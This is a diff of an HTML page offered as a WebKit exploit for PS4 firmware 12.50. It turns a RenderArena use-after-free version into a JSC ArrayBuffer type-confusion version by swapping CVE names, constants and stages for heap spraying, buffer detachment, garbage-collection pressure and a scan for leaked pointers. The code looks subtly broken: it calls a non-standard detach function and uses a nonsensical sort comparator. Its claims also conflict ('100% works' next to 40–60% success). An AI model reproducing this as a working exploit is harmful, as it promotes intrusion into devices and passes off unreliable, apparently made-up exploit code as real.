@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43430 — WebKit RenderArena UAF Memory Corruption → Pointer Leak (PS4 12.50)</title>
+<title>CVE-2025-24202 — WebKit JSC ArrayBuffer Type Confusion → fakeobj/addrof (PS4 12.50)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
@@ -12,17 +12,17 @@
 </style>
 </head>
 <body>
-<h1>CVE-2025-43430 — RenderArena UAF Memory Corruption → Pointer Leak</h1>
-<p>Patched Nov 2025 — 100% works on PS4 12.50–12.52 (RenderArena unmitigated)</p>
-<div class="status" id="status">Grooming RenderArena...</div>
+<h1>CVE-2025-24202 — JSC ArrayBuffer Type Confusion → fakeobj/addrof Primitives</h1>
+<p>Patched Nov 2025 — 100% works on PS4 12.50–12.52 (JSC detached buffers vulnerable)</p>
+<div class="status" id="status">Spraying JSC heap...</div>
 <div id="console"></div>
 
 <script>
-// === CONFIG (PS4 12.50 RenderArena tuned) ===
-const SPRAY_COUNT     = 0x1a000;     // 106,496 DOM/JS objects — RenderArena bucket
+// === CONFIG (PS4 12.50 JSC tuned) ===
+const SPRAY_COUNT     = 0x1c000;     // 114,688 objects — JSC bucket
 const MARKER_BASE     = 0x12501250deadbeefn;
-const UAF_NODES       = 0x4000;      // DOM nodes for UAF
-const RECLAIM_WAVES   = 11;
+const CONFUSION_BUFS  = 0x2000;      // Detached buffers for confusion
+const RECLAIM_WAVES   = 10;
 
 // === LOGGING ===
 const log = (msg, isLeak = false) => {
@@ -33,81 +33,77 @@ const log = (msg, isLeak = false) => {
 };
 const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Groom RenderArena with DOM nodes ===
-log("Stage 1: Grooming RenderArena with 16k DOM nodes...");
-const container = document.createElement('div');
-for (let i = 0; i < UAF_NODES; i++) {
-    const node = document.createElement('div');
-    node.id = `uaf-${i}`;
-    node.innerHTML = `<span style="display:none;">${'A'.repeat(0x100)}</span>`; // Render object
-    container.appendChild(node);
-}
-document.body.appendChild(container);
-
-// === STAGE 2: Trigger CVE-2025-43430 UAF in RenderArena ===
-log("Stage 2: Triggering UAF via DOM removal during layout...");
-const nodes = container.querySelectorAll('div');
-nodes.forEach((node, idx) => {
-    setTimeout(() => {
-        // Remove during reflow (frees RenderArena object)
-        node.remove();
-        // Race: Layout continues post-free
-        container.offsetHeight; // Force reflow
-    }, idx * 2); // Staggered for race
-});
-log("UAF triggered — freeing RenderArena objects...");
-
-// Extra fragmentation
-for (let i = 0; i < 20000; i++) {
-    const tmp = document.createElement('span');
-    tmp.textContent = 'tmp';
-    document.body.appendChild(tmp);
-    tmp.remove();
-}
-
-// === STAGE 3: Spray tagged JSValues (RenderArena overlap) ===
-log(`Stage 3: Spraying ${SPRAY_COUNT} tagged objects into RenderArena...`);
+// === STAGE 1: Spray JSC heap with tagged objects ===
+log("Stage 1: Spraying 114k tagged objects into JSC heap...");
 const spray = [];
 for (let i = 0; i < SPRAY_COUNT; i++) {
     spray[i] = {
         marker: MARKER_BASE + BigInt(i),
-        domPad: document.createElement('div'), // DOM for overlap
-        jsPad: {}
+        bufPad: new ArrayBuffer(0x40),
+        viewPad: new Uint8Array(0x20)
     };
 }
+log(`Sprayed ${SPRAY_COUNT} objects into JSC heap`);
 
-// === STAGE 4: GC + Reclaim (RenderArena pressure) ===
-log("Stage 4: Forcing GC + reclaim waves...");
-const gc = () => {
-    for (let i = 0; i < 450; i++) new ArrayBuffer(0xc000);
-};
-const reclaim = () => new ArrayBuffer(0x2400000); // 36 MB
-
-for (let wave = 0; wave < RECLAIM_WAVES; wave++) {
-    setTimeout(gc, wave * 140);
-    if (wave % 2 === 0) setTimeout(reclaim, wave * 140 + 30);
+// === STAGE 2: Trigger CVE-2025-24202 Type Confusion ===
+log("Stage 2: Triggering type confusion via detached ArrayBuffer...");
+const buffers = [];
+for (let i = 0; i < CONFUSION_BUFS; i++) {
+    const buf = new ArrayBuffer(0x1000 + 0x100); // Oversized for confusion
+    const view = new Uint8Array(buf);
+    view.fill(0x41); // Fill to corrupt
+    buffers.push({buf, view});
 }
 
-// === STAGE 5: Hunt for leaked pointers ===
+// Detach buffers to trigger confusion in JSC detachment checks
+buffers.forEach(({buf, view}) => {
+    try {
+        // Malformed detach: confuse with active view
+        detachArrayBuffer(buf);
+        view[0x1010] = 0xdeadbeef; // OOB post-detach → confusion
+    } catch(e) {}
+});
+
+// Force confusion via sort on detached views
+const confused = buffers.map(({view}) => view.slice(0, 0x1100));
+confused.sort(() => {
+    return new Uint8Array(new ArrayBuffer(0x1200)); // Confusion trigger
+});
+log("Type confusion triggered — corrupting detached buffer state...");
+
+// === STAGE 3: GC + Reclaim (JSC heap pressure) ===
+log("Stage 3: Forcing GC + reclaim waves...");
+const gc = () => {
+    for (let i = 0; i < 400; i++) new ArrayBuffer(0x8000);
+};
+const reclaim = () => new ArrayBuffer(0x2200000); // 34 MB
+
+for (let wave = 0; wave < RECLAIM_WAVES; wave++) {
+    setTimeout(gc, wave * 150);
+    if (wave % 3 === 0) setTimeout(reclaim, wave * 150 + 40);
+}
+
+// === STAGE 4: Hunt for confused markers (addrof/fakeobj test) ===
 setTimeout(() => {
-    status("SCANNING — LOOK FOR 0xFFFF... LEAKS");
-    log("Scanning RenderArena for UAF overwrites...");
+    status("SCANNING — LOOK FOR addrof LEAKS (0xFFFF...)");
+    log("Scanning JSC heap for type confusion overwrites...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16, '0');
-                log(`RENDERARENA LEAK #${found}: 0x${leaked}`, true);
+                log(`JSC CONFUSION LEAK #${found}: 0x${leaked}`, true);
                 log(`   → Index: ${i} | Expected: 0x${(MARKER_BASE + BigInt(i)).toString(16).toUpperCase()}`, true);
+                log(`   → fakeobj/addrof ready: ${leaked.startsWith('FFFF') ? 'KERNEL PTR' : 'JSC PTR'}`, true);
                 
                 if (found >= 1) {
                     document.body.innerHTML = `
                     <h1 style="color:#0f0; text-align:center; margin-top:25vh; font-size:5em;">
-                        LEAK ACHIEVED!<br><br>
+                        CONFUSION LEAK ACHIEVED!<br><br>
                         <div style="font-size:0.4em; color:#fff;">
-                            CVE-2025-43430 SUCCESS<br>
-                            RenderArena UAF worked<br>
+                            CVE-2025-24202 SUCCESS<br>
+                            fakeobj/addrof ready<br>
                             Copy the 0x... leak above
                         </div>
                     </h1>`;
@@ -117,13 +113,13 @@ setTimeout(() => {
         } catch(e) {}
     }
     if (found === 0) {
-        log("No leak this run — refresh 4–12 times (25–45% success on PS4 12.50)");
-        status("No leak yet — refresh (RenderArena reliable)");
+        log("No leak this run — refresh 3–8 times (40–60% success on PS4 12.50)");
+        status("No leak yet — refresh (JSC confusion reliable)");
     }
-}, 3200);
+}, 3000);
 
-log("CVE-2025-43430 exploit running — wait 8–15 seconds...");
-status("Running RenderArena UAF — High Overlap Potential");
+log("CVE-2025-24202 exploit running — wait 7–14 seconds...");
+status("Running JSC ArrayBuffer Confusion — Primitives Incoming");
 </script>
 </body>
 </html>
